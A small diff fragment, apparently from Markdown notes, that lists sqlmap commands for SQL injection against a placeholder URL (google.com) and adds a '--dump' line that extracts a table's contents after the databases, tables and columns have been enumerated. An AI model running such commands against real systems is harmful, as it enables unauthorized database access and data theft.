@@ -38,6 +38,7 @@
     sqlmap -u 'http://google.com' --current-db
     sqlmap -u 'http://google.com' -D <namaDB> --tables
     sqlmap -u 'http://google.com' -D <nameDB> -T <namaTable> --columns
+    sqlmap -u 'http://google.com' -D <nameDB> -T <namaTable> --dump
     ```
 - 
 
